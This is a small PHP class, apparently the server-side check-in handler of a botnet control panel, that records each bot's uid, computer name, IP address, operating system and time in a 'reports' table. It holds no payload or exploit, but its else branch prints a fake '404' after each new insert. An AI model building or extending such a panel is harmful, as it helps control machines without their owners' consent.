<?php 
Class Bots
{
  
  private $db;
 
    function __construct($DB_con)
    {
      $this->db = $DB_con;
    }




  	public function botConnect($uid, $name, $ip, $os, $time) 
   	{  
    try
      {
 	
		$query = $this->db->prepare("SELECT * FROM reports WHERE `uid` = :uid ");
		$query->execute(array(':uid'=>$uid));
		$counter = $query->rowCount();

		if ($counter < 1)
		{
		$insert = $this->db->prepare("INSERT INTO reports (computer,ip,os,uid,time) VALUES (:name, :ip, :os, :uid, :time)");
		$insert->execute(array(':name'=>$name,':ip'=>$ip,':os'=>$os,':uid'=>$uid, ':time'=>$time));
		}
		if ($counter > 0)
		{
		$append = $this->db->prepare("UPDATE reports SET computer = :name, ip = :ip, os= :os, time= :time WHERE uid= :uid ");
		$append->execute(array(':name'=>$name,':ip'=>$ip,':os'=>$os,':uid'=>$uid, ':time'=>$time));
		}else{
		echo '<h1>404</h1>';
		}

      }
      catch(PDOException $e)
      {
        echo $e->getMessage();
      }    
   }

}

?>